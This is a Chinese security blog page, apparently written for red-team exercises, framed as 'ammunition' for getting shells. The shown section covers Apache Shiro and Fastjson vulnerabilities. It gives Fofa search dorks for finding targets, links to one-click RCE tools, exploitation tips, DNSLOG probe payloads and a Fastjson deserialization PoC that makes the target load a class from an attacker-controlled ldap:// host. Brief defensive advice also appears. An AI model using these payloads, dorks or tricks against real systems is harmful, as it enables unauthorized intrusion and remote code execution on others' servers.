<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='第一节 各小伙伴们, 安全界一年一度的激动人心的攻防演练盛况即将来临:) 这里给大家准备些弹药, 主要是近些年的可以进后台/getshell的漏洞, 漏洞太多难免疏漏. 基本都是常规操作加一点小技巧, 大部分漏洞均分析过或实践过, 如有错误欢迎【斧】正, 如有补充也欢迎评论留言. 另外, 有些漏洞没有找到外部公开信息, 考虑涉及相关法律法规, 不宜披露, 请见谅. 想深度交流的欢迎沟通. 由于本文长度接近四万字, 所以采取分篇连载.
Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437) 1. 漏洞简介
Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用
2. 影响组件
Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)
3. 漏洞指纹
set-Cookie: rememberMe=deleteMe 或者URL中有shiro字样 有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可
4. Fofa Dork
app=&amp;quot;Apache-Shiro&amp;quot;
5. 漏洞分析
【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞 https://paper.seebug.org/shiro-rememberme-1-2-4/
6. 漏洞利用
wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具 https://github.com/wyzxxz/shiro_rce
Apache Shiro回显poc改造计划 https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw
7. 利用技巧
1.使用多个泄露的key进行遍历, 这个在实战中确实有效'>
<title>2020攻防演练弹药库-您有主机上线请注意</title>

<link rel='canonical' href='https://360rce.github.io/p/bw9pj09k/'>

<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='2020攻防演练弹药库-您有主机上线请注意'>
<meta property='og:description' content='第一节 各小伙伴们, 安全界一年一度的激动人心的攻防演练盛况即将来临:) 这里给大家准备些弹药, 主要是近些年的可以进后台/getshell的漏洞, 漏洞太多难免疏漏. 基本都是常规操作加一点小技巧, 大部分漏洞均分析过或实践过, 如有错误欢迎【斧】正, 如有补充也欢迎评论留言. 另外, 有些漏洞没有找到外部公开信息, 考虑涉及相关法律法规, 不宜披露, 请见谅. 想深度交流的欢迎沟通. 由于本文长度接近四万字, 所以采取分篇连载.
Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437) 1. 漏洞简介
Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用
2. 影响组件
Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)
3. 漏洞指纹
set-Cookie: rememberMe=deleteMe 或者URL中有shiro字样 有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可
4. Fofa Dork
app=&amp;quot;Apache-Shiro&amp;quot;
5. 漏洞分析
【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞 https://paper.seebug.org/shiro-rememberme-1-2-4/
6. 漏洞利用
wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具 https://github.com/wyzxxz/shiro_rce
Apache Shiro回显poc改造计划 https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw
7. 利用技巧
1.使用多个泄露的key进行遍历, 这个在实战中确实有效'>
<meta property='og:url' content='https://360rce.github.io/p/bw9pj09k/'>
<meta property='og:site_name' content='iceH&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='HVV' /><meta property='article:tag' content='2020攻防演练' /><meta property='article:published_time' content='2020-04-24T16:28:37&#43;00:00'/><meta property='article:modified_time' content='2020-04-24T16:28:37&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/7p/wallhaven-7ploe9.png' />
<meta name="twitter:title" content="2020攻防演练弹药库-您有主机上线请注意">
<meta name="twitter:description" content="第一节 各小伙伴们, 安全界一年一度的激动人心的攻防演练盛况即将来临:) 这里给大家准备些弹药, 主要是近些年的可以进后台/getshell的漏洞, 漏洞太多难免疏漏. 基本都是常规操作加一点小技巧, 大部分漏洞均分析过或实践过, 如有错误欢迎【斧】正, 如有补充也欢迎评论留言. 另外, 有些漏洞没有找到外部公开信息, 考虑涉及相关法律法规, 不宜披露, 请见谅. 想深度交流的欢迎沟通. 由于本文长度接近四万字, 所以采取分篇连载.
Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437) 1. 漏洞简介
Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用
2. 影响组件
Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)
3. 漏洞指纹
set-Cookie: rememberMe=deleteMe 或者URL中有shiro字样 有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可
4. Fofa Dork
app=&amp;quot;Apache-Shiro&amp;quot;
5. 漏洞分析
【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞 https://paper.seebug.org/shiro-rememberme-1-2-4/
6. 漏洞利用
wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具 https://github.com/wyzxxz/shiro_rce
Apache Shiro回显poc改造计划 https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw
7. 利用技巧
1.使用多个泄露的key进行遍历, 这个在实战中确实有效"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://w.wallhaven.cc/full/7p/wallhaven-7ploe9.png' />
    <link rel="shortcut icon" href="/favicon.ico" />
<style>
    :root {
     
    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
  }
</style>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
        customFont.type = "text/css";
        customFont.rel = "stylesheet";
         document.head.appendChild(customFont);
}());
</script>
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended">


        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>返回</span>
            </a>
        </div>
    

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
            
        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#第一节">第一节</a></li>
    <li><a href="#apache-shiro-rememberme-反序列化导致的命令执行漏洞-shiro-550-cve-2016-4437">Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)</a></li>
    <li><a href="#apache-shiro-padding-oracle-attack-shiro-721">Apache Shiro Padding Oracle Attack (Shiro-721)</a></li>
    <li><a href="#apache-shiro-权限绕过漏洞-shiro-682">Apache Shiro 权限绕过漏洞 (Shiro-682)</a></li>
    <li><a href="#fastjson-反序列化远程代码执行漏洞">Fastjson 反序列化远程代码执行漏洞</a></li>
    <li><a href="#jackson-反序列化远程代码执行漏洞">Jackson 反序列化远程代码执行漏洞</a></li>
    <li><a href="#xstream-反序列化漏洞">Xstream 反序列化漏洞</a></li>
    <li><a href="#泛微oa-bsh-远程代码执行漏洞">泛微OA Bsh 远程代码执行漏洞</a></li>
    <li><a href="#泛微oa-e-cology-sql注入漏洞">泛微OA e-cology SQL注入漏洞</a></li>
    <li><a href="#泛微oa-数据库泄露漏洞">泛微OA 数据库泄露漏洞</a></li>
    <li><a href="#通达oa-远程代码执行漏洞">通达OA 远程代码执行漏洞</a></li>
    <li><a href="#致远-oa-a8-htmlofficeservlet-getshell-漏洞">致远 OA A8 htmlofficeservlet getshell 漏洞</a></li>
    <li><a href="#致远oa-帆软报表-seeyonreport-远程代码执行">[致远OA] 帆软报表 seeyonreport 远程代码执行</a></li>
    <li><a href="#smartbi-前台sql注入">Smartbi 前台SQL注入</a></li>
    <li><a href="#第二节">第二节</a></li>
    <li><a href="#深信服vpn远程代码执行">深信服VPN远程代码执行</a></li>
    <li><a href="#深信服-vpn-口令爆破">深信服 VPN 口令爆破</a></li>
    <li><a href="#fortigate-ssl-vpn-文件读取远程代码执行">Fortigate SSL VPN 文件读取/远程代码执行</a></li>
    <li><a href="#pulse-secure-ssl-vpn远程代码执行漏洞">Pulse Secure SSL VPN远程代码执行漏洞</a></li>
    <li><a href="#palo-alto-globalprotect-vpn远程代码执行漏洞">Palo Alto GlobalProtect VPN远程代码执行漏洞</a></li>
    <li><a href="#citrix-gatewayadc-远程代码执行漏洞-cve-2019-19781">Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)</a></li>
    <li><a href="#齐治堡垒机相关漏洞">齐治堡垒机相关漏洞</a></li>
    <li><a href="#exchange-相关漏洞">Exchange 相关漏洞</a></li>
    <li><a href="#coremail-相关漏洞">Coremail 相关漏洞</a></li>
    <li><a href="#winmail-相关漏洞">Winmail 相关漏洞</a></li>
    <li><a href="#zabbix-相关漏洞">Zabbix 相关漏洞</a></li>
    <li><a href="#边界产品防火墙-网关-路由器-vpn-相关漏洞">边界产品(防火墙, 网关, 路由器, VPN) 相关漏洞</a></li>
    <li><a href="#第三节">第三节</a></li>
    <li><a href="#thinkphp-相关漏洞">Thinkphp 相关漏洞</a></li>
    <li><a href="#spring-系列漏洞">Spring 系列漏洞</a></li>
    <li><a href="#phpstudy-后门远程代码执行">Phpstudy 后门远程代码执行</a></li>
    <li><a href="#struts-系列漏洞">Struts 系列漏洞</a></li>
    <li><a href="#solr-系列漏洞">Solr 系列漏洞</a></li>
    <li><a href="#tomcat-本地文件包含漏洞-cve-2020-1938">Tomcat 本地文件包含漏洞 (CVE-2020-1938)</a></li>
    <li><a href="#php-fpm-远程代码执行漏洞">PHP-FPM 远程代码执行漏洞</a></li>
    <li><a href="#cve-2019-3396-confluence-wiki-远程代码执行">CVE-2019-3396 Confluence Wiki 远程代码执行</a></li>
    <li><a href="#ghostscript-上传图片代码执行">Ghostscript 上传图片代码执行</a></li>
    <li><a href="#jboss-相关漏洞">Jboss 相关漏洞</a></li>
    <li><a href="#websphere-反序列化远程代码执行">Websphere 反序列化远程代码执行</a></li>
    <li><a href="#jenkins-系列漏洞">Jenkins 系列漏洞</a></li>
    <li><a href="#rmi-对外开放">RMI 对外开放</a></li>
    <li><a href="#weblogic-t3-协议漏洞">Weblogic T3 协议漏洞</a></li>
    <li><a href="#weblogic-xmldecoder反序列化">Weblogic XMLDecoder反序列化</a></li>
    <li><a href="#weblogic-iiop">Weblogic IIOP</a></li>
    <li><a href="#redis-相关漏洞">Redis 相关漏洞</a></li>
    <li><a href="#后记">后记</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/bw9pj09k/">
                
                    <img src="https://w.wallhaven.cc/full/7p/wallhaven-7ploe9.png" loading="lazy" alt="Featured image of post 2020攻防演练弹药库-您有主机上线请注意" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E5%B7%9E/" >
                吹梦到西州
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/bw9pj09k/">2020攻防演练弹药库-您有主机上线请注意</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
                
                <time class="article-time--published">2020/04/24</time>
            </div>
        

        
            <div>
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
                
                <time class="article-time--reading">
                    阅读时长: 26 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="第一节">第一节</h2>
<blockquote>
<p>各小伙伴们, 安全界一年一度的激动人心的攻防演练盛况即将来临:) 这里给大家准备些弹药, 主要是近些年的可以进后台/getshell的漏洞, 漏洞太多难免疏漏.
基本都是常规操作加一点小技巧, 大部分漏洞均分析过或实践过, 如有错误欢迎【斧】正, 如有补充也欢迎评论留言.
另外, 有些漏洞没有找到外部公开信息, 考虑涉及相关法律法规, 不宜披露, 请见谅. 想深度交流的欢迎沟通.
由于本文长度接近四万字, 所以采取分篇连载.</p>
</blockquote>
<h2 id="apache-shiro-rememberme-反序列化导致的命令执行漏洞-shiro-550-cve-2016-4437">Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用</p>
<p><strong>2. 影响组件</strong></p>
<p>Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>set-Cookie: rememberMe=deleteMe</code>
或者URL中有shiro字样
有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Apache-Shiro&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞
<a class="link" href="https://paper.seebug.org/shiro-rememberme-1-2-4/"  target="_blank" rel="noopener"
    >https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具
<a class="link" href="https://github.com/wyzxxz/shiro_rce"  target="_blank" rel="noopener"
    >https://github.com/wyzxxz/shiro_rce</a></p>
<p>Apache Shiro回显poc改造计划
<a class="link" href="https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw"  target="_blank" rel="noopener"
    >https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.使用多个泄露的key进行遍历, 这个在实战中确实有效</p>
<p>关于Shiro反序列化漏洞的延伸—升级shiro也能被shell
<a class="link" href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw"  target="_blank" rel="noopener"
    >https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw</a></p>
<p>Shiro 100 Key
<a class="link" href="https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA"  target="_blank" rel="noopener"
    >https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA</a></p>
<p>2.使用 <code>URLDNS</code> 进行检测提速</p>
<p>使用适应性最强的<code>URLDNS</code>(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测</p>
<p>且可以使用<code>ysoserial</code>提前生成序列化内容</p>
<p><code>java -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar URLDNS &quot;http://1234567890.test.ceye.io&quot; &gt; urldns.ser</code></p>
<p>然后使用<code>占位符+目标url hash</code>的方法修改序列化内容中的<code>urldns</code>地址</p>
<p>提高检测速度以及后续检测无需使用<code>ysoserial</code></p>
<p>例如 <code>1234567890.test.ceye.io</code> 可以换成 <code>md5('www.qq.com').hexdigest() [:10].test.ceye.io</code></p>
<p>也就是 <code>9d2c68d82d.test.ceye.io</code></p>
<p>可以预先记录 hash</p>
<p><code>9d2c68d82d www.qq.com</code></p>
<p>然后进行hash查表就可以知道是<code>DNSLOG</code>来自哪个目标, 性能会提高不少</p>
<p>3.已知目标使用了<code>Shiro</code>, 可以采取<code>Shiro-721</code>的报错逻辑来进行遍历<code>key</code> — 星光哥</p>
<p>这样即使DNS不能出网, 也可以通过是否返回 <code>rememberMe=deleteMe</code> 来断定 <code>shiro</code> <code>key</code> 的正确性, 前提是服务器有<code>rememberMe=deleteMe</code>相关回显</p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级Shiro到最新版</p>
<p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
<p>3.WAF拦截Cookie中长度过大的rememberMe值</p>
<h2 id="apache-shiro-padding-oracle-attack-shiro-721">Apache Shiro Padding Oracle Attack (Shiro-721)</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Apache Shiro 是企业常见的 Java安全框架, 由于<code>Shiro</code>使用<code>AES-CBC</code>模式进行加解密处理, 所以存在<code>Padding Oracle Attack</code>漏洞, 已经登录的攻击者同样可以进行反序列化操作</p>
<p><strong>2. 影响组件</strong></p>
<p>Apache Shiro &lt; 1.4.2</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>set-Cookie: rememberMe=deleteMe</code>
URL中有shiro字样
有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Apache-Shiro&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Shiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台
<a class="link" href="https://www.anquanke.com/post/id/193165"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/193165</a></p>
<p>Apache Shiro 远程代码执行漏洞复现 – OnionT’s Blog
<a class="link" href="http://www.oniont.cn/index.php/archives/298.html"  target="_blank" rel="noopener"
    >http://www.oniont.cn/index.php/archives/298.html</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>wuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack)
<a class="link" href="https://github.com/wuppp/shiro_rce_exp"  target="_blank" rel="noopener"
    >https://github.com/wuppp/shiro_rce_exp</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.该漏洞需要登录后获取到合法的<code>Cookie: rememberMe=XXX</code>后才可以进行利用, 看起来不是很好利用</p>
<p>但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥</p>
<p>所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性</p>
<p>2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 <code>rememberMe</code></p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级Shiro到最新版</p>
<p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p>
<p>3.WAF拦截Cookie中长度过大的rememberMe值</p>
<p>4.WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie</p>
<h2 id="apache-shiro-权限绕过漏洞-shiro-682">Apache Shiro 权限绕过漏洞 (Shiro-682)</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Apache Shiro 是企业常见的Java安全框架, 由于Shiro的拦截器和spring(Servlet)拦截器对于URI模式匹配的差异, 导致出现鉴权问题</p>
<p><strong>2. 影响组件</strong></p>
<p>Apache Shiro &lt; 1.5.2</p>
<p><strong>3. 漏洞指纹</strong></p>
<p><code>set-Cookie: rememberMe=deleteMe</code>
或者URL中有shiro字样
有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p>
<p><strong>4. Fofa Dork</strong></p>
<p><code>app=&quot;Apache-Shiro&quot;</code></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心
<a class="link" href="https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/"  target="_blank" rel="noopener"
    >https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>Shiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心
<a class="link" href="https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/"  target="_blank" rel="noopener"
    >https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/</a></p>
<p><strong>7. 利用技巧</strong></p>
<p>1.url中间可以尝试添加 <code>../</code> , 不限于这个漏洞, 可能会有惊喜, 错误的Nginx配置也会造成新的漏洞</p>
<p>关于url解析的问题可以参考以下链接</p>
<p>A New Era of SSRF – Exploiting URL Parser in Trending Programming Languages!
<a class="link" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf"  target="_blank" rel="noopener"
    >https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p>
<p>Tomcat URL解析差异性导致的安全问题 – 先知社区
<a class="link" href="https://xz.aliyun.com/t/7544"  target="_blank" rel="noopener"
    >https://xz.aliyun.com/t/7544</a></p>
<p><strong>8. 防护方法</strong></p>
<p>1.升级1.5.2版本及以上</p>
<p>2.尽量避免使用*通配符作为动态路由拦截器的URL路径表达式.</p>
<h2 id="fastjson-反序列化远程代码执行漏洞">Fastjson 反序列化远程代码执行漏洞</h2>
<p><strong>1. 漏洞简介</strong></p>
<p>Fastjosn 无疑是这两年的漏洞之王, 一手反序列化RCE影响无数厂商, 目前1.2.48以下版本稳定受影响, 1.2.68以下版本开启Autotype会受到影响</p>
<p>(不排除传说中的1.2.67以下RCE漏洞, 期待八仙过海)</p>
<p><strong>2. 影响组件</strong></p>
<p>Fastjson &lt; 1.2.48 (&lt;1.2.68?)</p>
<p><strong>3. 漏洞指纹</strong></p>
<p>可以通过DNS回显的方式检测后端是否使用Fastjson</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;@type&#34;:&#34;java.net.Inet4Address&#34;, &#34;val&#34;:&#34;dnslog&#34;}
</span></span><span class="line"><span class="cl">{&#34;@type&#34;:&#34;java.net.Inet6Address&#34;, &#34;val&#34;:&#34;dnslog&#34;}
</span></span><span class="line"><span class="cl">{&#34;@type&#34;:&#34;java.net.InetSocketAddress&#34;{&#34;address&#34;:, &#34;val&#34;:&#34;dnslog&#34;}}
</span></span><span class="line"><span class="cl">{&#34;@type&#34;:&#34;com.alibaba.fastjson.JSONObject&#34;, {&#34;@type&#34;: &#34;java.net.URL&#34;, &#34;val&#34;:&#34;dnslog&#34;}}&#34;&#34;}
</span></span><span class="line"><span class="cl">{{&#34;@type&#34;:&#34;java.net.URL&#34;, &#34;val&#34;:&#34;dnslog&#34;}:&#34;aaa&#34;}
</span></span><span class="line"><span class="cl">Set[{&#34;@type&#34;:&#34;java.net.URL&#34;, &#34;val&#34;:&#34;dnslog&#34;}]
</span></span><span class="line"><span class="cl">Set[{&#34;@type&#34;:&#34;java.net.URL&#34;, &#34;val&#34;:&#34;dnslog&#34;}
</span></span><span class="line"><span class="cl">{{&#34;@type&#34;:&#34;java.net.URL&#34;, &#34;val&#34;:&#34;dnslog&#34;}:0
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以通过DOS时间延迟或者报错回显的方式检测</p>
<p>无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (&lt;1.2.60)
<a class="link" href="https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/"  target="_blank" rel="noopener"
    >https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/</a></p>
<p>fastjson &lt; 1.2.66 版本最新漏洞分析
<a class="link" href="https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q"  target="_blank" rel="noopener"
    >https://mp.weixin.qq.com/s/RShHui_TJeZM7-frzCfH7Q</a></p>
<p><strong>4. Fofa Dork</strong></p>
<p><strong>5. 漏洞分析</strong></p>
<p>Fastjson &lt;=1.2.47 远程代码执行漏洞分析 – 安全客, 安全资讯平台
<a class="link" href="https://www.anquanke.com/post/id/181874"  target="_blank" rel="noopener"
    >https://www.anquanke.com/post/id/181874</a></p>
<p><strong>6. 漏洞利用</strong></p>
<p>1.JDK降级编译</p>
<p>CaijiOrz/fastjson-1.2.47-RCE: Fastjson &lt;= 1.2.47 远程命令执行漏洞利用工具及方法
<a class="link" href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE"  target="_blank" rel="noopener"
    >https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
<p>源项目中最后一句</p>
<blockquote>
<p>当javac版本和目标服务器差太多, 会报一个这样得到错误, 所以需要使用1.8的javac来编译Exploit.java</p>
</blockquote>
<p>这里并不需要更换jdk版本, 我们可以使用JDK降级编译的手法, 这样1.8的jdk也可以编译出来1.7版本的<code>.class</code> , 相信可以解决很多小伙伴的问题</p>
<p><code>javac -source 1.7 -target 1.7 Exploit.java</code></p>
<p>1.2.47版本以下通杀Poc:</p>
<p><code>{&quot;name&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}, &quot;f&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://asdfasfd/&quot;, &quot;autoCommit&quot;:true}}, age:11}</code></p>
<p>其中<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://asdfasfd/&quot;, &quot;autoCommit&quot;:true}</code>也可以替换成其他利用链</p>
<p>2.优先使用LDAP协议</p>
<p>根据实战中经验, 这里更推荐使用ldap协议进行漏洞利用, 原因如下</p>
<blockquote>
<p>RMI协议的利用方式 在<code>JDK 6u132/7u122/8u113</code> 及以上版本中修复了
LDAP协议的利用方式 在<code>JDK 6u211/7u201/8u191</code> 及以上版本中修复了</p>
</blockquote>
<p>所以,LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕过更高版本的JDK限制</p>
